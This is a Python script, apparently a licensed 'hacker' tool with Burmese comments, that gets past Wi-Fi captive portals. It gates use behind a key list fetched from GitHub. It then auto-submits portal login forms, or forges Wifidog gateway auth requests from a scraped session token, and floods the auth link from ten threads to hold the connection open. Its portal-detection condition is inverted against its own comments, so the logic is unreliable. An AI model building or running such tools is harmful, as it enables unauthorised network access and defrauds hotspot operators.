import requests, re, urllib3, time, threading, random, sys, os, uuid
from urllib.parse import urlparse, parse_qs, urljoin
from rich.console import Console
from rich.panel import Panel
from rich.align import Align

# CONFIG
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
console = Console()
PING_THREADS = 10 
URL = "https://raw.githubusercontent.com/hhtethtet277-svg/my-database-/refs/heads/main/key.txt"
stop_event = threading.Event()

# LOGO
BABY_LOGO = "\n[bold cyan]      _ \n    _(_)_ \n   (_)@(_) \n     (_)\  / \n      /  || \n  ___/___||___\n |____________|[/bold cyan]"
BANNER = "[bold #00FF00]\n ╔╦╗╔═╗╔═╗  ╦ ╦╦ ╦\n ║║║║ ║║╣   ╚╦╝║ ║\n ╩ ╩╚═╝╚═╝   ╩ ╚═╝\n      [#00FF00]M O E   Y U   H A C K E R[/#00FF00][/bold #00FF00]"

def get_hwid():
    id_file = os.path.expanduser("~/.moe_yu_id")
    try:
        if os.path.exists(id_file):
            with open(id_file, "r") as f: return f.read().strip()
        new_id = f"MOE-{str(uuid.uuid4()).split('-')[0].upper()}"
        with open(id_file, "w") as f: f.write(new_id)
        return new_id
    except: return "MOE-DEFAULT"

def check_license_hacker_style():
    my_hwid = get_hwid()
    console.clear()
    console.print(Align.center(BABY_LOGO))
    console.print(Align.center(BANNER))
    console.print(Align.center(Panel(f"[bold white]HWID: [yellow]{my_hwid}[/yellow][/bold white]", border_style="bold cyan", expand=False)))
    
    user_key = input("\n  [SECURITY_ACCESS] @MoeYu_").strip()
    try:
        res = requests.get(URL, timeout=10)
        for entry in res.text.splitlines():
            parts = entry.split("|")
            if len(parts) >= 1 and user_key == parts[0].strip():
                if len(parts) > 2 and parts[2].strip() != "FREE" and parts[2].strip() != my_hwid:
                    console.print("[red]❌ HWID MISMATCH![/red]"); sys.exit()
                return True
        console.print("[red]❌ INVALID KEY![/red]"); sys.exit()
    except: console.print("[red]📡 CONNECTION ERROR![/red]"); sys.exit()

def start_bypass_process():
    session = requests.Session()
    session.headers.update({'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Mobile Safari/537.36'})
    
    while not stop_event.is_set():
        console.print("[yellow][*] Searching for Portal...[/yellow]")
        try:
            r = session.get("http://connectivitycheck.gstatic.com/generate_204", timeout=10, allow_redirects=True)
            portal_url = r.url
            
            # အင်တာနက် သုံးလို့ရနေရင် (204 မဟုတ်ဘဲ 200 ဖြစ်နေရင်) Portal ရှာစရာမလိုတော့ပါ
            if r.status_code == 204:
                page = session.get(portal_url, timeout=10, verify=False)
                auth_link = None
                
                # Old Portal (Form)
                form = re.search(r'<form.*?action=["\'](.*?)["\'].*?>', page.text, re.DOTALL)
                if form:
                    action = form.group(1)
                    auth_url = action if action.startswith('http') else urljoin(portal_url, action)
                    inputs = re.findall(r'<input.*?name=["\'](.*?)["\'].*?value=["\'](.*?)["\']', page.text)
                    session.post(auth_url, data={name: val for name, val in inputs})
                    auth_link = auth_url
                else:
                    # New Portal (Wifidog)
                    sid = re.search(r'sessionId=([a-zA-Z0-9]+)', page.text)
                    if sid:
                        p = parse_qs(urlparse(portal_url).query)
                        auth_link = f"http://{p.get('gw_address',['192.168.60.1'])[0]}:{p.get('gw_port',['2060'])[0]}/wifidog/auth?token={sid.group(1)}"
                
                if not auth_link:
                    console.print("[yellow][!] Portal မတွေ့သေးပါ။ 5 စက္ကန့် စောင့်ပြီး ပြန်စစ်နေသည်...[/yellow]")
                    time.sleep(5)
                    continue 
                
                # Auth တွေ့သွားရင် Ping Loop စမယ်
                console.print("[green][✓] Auth Link Found! Starting Aggressive Pulse...[/green]")
                def pulse_ping(is_main):
                    while not stop_event.is_set():
                        try: 
                            session.get(auth_link, timeout=5)
                            if is_main:
                                sys.stdout.write(f"\r[green]✓[/green] [bold white]အင်တာနက် ချိတ်သွားပါပြီး အသုံးပြုလို့ရပါပြီ[/bold white]")
                                sys.stdout.flush()
                        except: pass
                        time.sleep(2)

                for i in range(PING_THREADS):
                    threading.Thread(target=pulse_ping, args=(i==0,), daemon=True).start()
                
                while True: time.sleep(10)
            else:
                # အင်တာနက် ရနေရင်
                console.print("[green][✓] အင်တာနက် ချိတ်ဆက်ပြီးသား ဖြစ်နေပါသည်။[/green]")
                time.sleep(10)

        except Exception as e:
            console.print(f"[red][!] Error: {e}. 5 စက္ကန့် စောင့်ပြီး ပြန်ကြိုးစားမည်...[/red]")
            time.sleep(5)

if __name__ == "__main__":
    if check_license_hacker_style():
        try: start_bypass_process()
        except KeyboardInterrupt: sys.exit()
